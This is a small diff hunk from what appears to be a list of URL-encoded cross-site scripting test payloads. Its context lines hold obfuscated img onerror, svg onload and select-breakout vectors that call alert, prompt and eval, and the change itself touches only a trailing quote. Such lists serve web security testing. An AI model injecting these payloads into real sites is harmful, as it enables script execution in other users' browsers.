@@ -23,5 +23,4 @@
 %3Cimg%2Fsrc%2Fonerror%3D%22this.ownerDocument.defaultView%5B%27%5Cu0061lert%27%5D%284%29%22%3E&
 10%3C%2Foption%3E%3C%2Fselect%3E%3Cimg%2Fsrc%3Dxon%3D%28%29onx%2Bhonerror%3Dalert%281%29%3Ess%3Csvg%2Fonload%3Dprompt%28document.domain%29%2520%3E&
 %3Cimg+src%3Dx+onerror%3D%22eval%28%27%5Cx61lert%281%29%27%29%22%2F%3E&
-'
-
+''
